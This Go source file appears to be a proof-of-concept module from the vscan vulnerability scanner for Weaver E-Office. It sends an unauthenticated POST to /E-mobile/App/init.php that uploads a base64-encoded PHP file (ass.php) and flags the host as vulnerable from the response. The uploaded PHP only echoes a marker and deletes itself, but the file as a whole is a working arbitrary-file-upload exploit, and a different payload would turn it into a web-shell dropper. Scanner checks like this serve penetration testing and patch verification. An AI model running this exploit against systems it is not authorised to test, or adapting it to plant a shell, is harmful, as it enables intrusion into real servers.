package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_FlowCommon_uploald(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded;"
	payload := "m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=ass.php"
	url := u + "/E-mobile/App/init.php"
	if req, err := pkg.HttpRequset(url, "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "?diff=") && strings.Contains(req.Body, "flag") && strings.Contains(req.Body, "url") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_FlowCommon_uploald|%s\n", url))
			return true
		}
	}

	return false
}
